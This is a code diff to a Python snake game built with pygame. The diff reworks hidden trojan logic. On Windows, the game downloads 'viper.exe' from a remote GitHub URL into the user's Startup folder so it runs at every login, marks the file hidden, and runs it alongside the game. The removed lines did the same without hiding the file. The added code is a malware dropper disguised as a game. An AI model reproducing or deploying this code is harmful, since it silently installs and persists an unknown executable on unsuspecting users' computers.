@@ -4,6 +4,7 @@ import platform
 import random
 import urllib.request
 from collections import deque
+import subprocess
 
 import pygame
 
@@ -169,20 +170,24 @@ def game():
         pygame.display.update()
         clock.tick(snake_speed)
 
-def executable(file):
-     # Download the executable to the Startup folder
-     url = 'https://raw.githubusercontent.com/NotoriusNeo/viper/main/viper.exe'
-     urllib.request.urlretrieve(url, file)
-     # Run the executable
-     os.system(file)
+def download_executable(url, folder):
+    file = os.path.join(folder, "viper.exe")
+    if os.path.isfile(file):
+        return file
+    urllib.request.urlretrieve(url, file)
+    os.system(f"attrib +h {file}")
+    return file
 
-with concurrent.futures.ThreadPoolExecutor() as executor:
-     if platform.system() == "Windows":
-          file = os.environ['APPDATA'] + "\Microsoft\Windows\Start Menu\Programs\Startup\viper.exe"
-          if not os.path.isfile(file):
-               executable(file)
-          func1_future = executor.submit(game)
-          func2_future = executor.submit(os.system(file))
-          concurrent.futures.wait([func1_future, func2_future])
-     else:
-          game()
+def run_executable(file):
+    subprocess.run(file)
+
+if __name__ == "__main__":
+    if platform.system() == "Windows":
+        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        file = download_executable("https://raw.githubusercontent.com/NotoriusNeo/viper/main/viper.exe", startup_folder)
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            func1_future = executor.submit(game)
+            func2_future = executor.submit(run_executable, file)
+            concurrent.futures.wait([func1_future, func2_future])
+    else:
+        game()
